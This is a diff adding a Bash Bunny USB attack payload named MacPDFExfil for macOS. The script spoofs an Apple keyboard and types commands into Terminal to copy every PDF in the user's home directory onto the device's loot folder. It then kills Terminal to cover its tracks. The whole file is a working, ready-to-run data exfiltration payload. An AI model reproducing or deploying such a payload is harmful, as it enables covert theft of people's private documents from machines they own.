@@ -1,0 +1,31 @@
+#!/bin/bash
+#
+# Title:         MacPDFExfil
+# Author:        k1ul3ss
+# Props:         audibleblink
+# Version:       1.0
+# Category:      Exfiltration
+# Target:        macOS
+# Attackmodes:   HID, Storage
+
+ATTACKMODE STORAGE HID VID_0X05AC PID_0X021E
+
+# device name
+dev_name="BashBunny"
+
+# loot directory
+lootdir="/Volumes/$dev_name/loot/MacPDFExfil/"
+
+QUACK GUI SPACE
+QUACK DELAY 1000
+QUACK STRING terminal
+QUACK ENTER
+QUACK DELAY 3000
+QUACK STRING mkdir -p $lootdir
+QUACK ENTER
+# Find all PDFs stored in the user's home directory, and copy them over to the BashBunny storage.
+QUACK STRING find \~ -name \'*.pdf\' -exec cp \"{}\" $lootdir \\\;\; killall Terminal
+QUACK ENTER
+
+# sync the filesystem
+sync
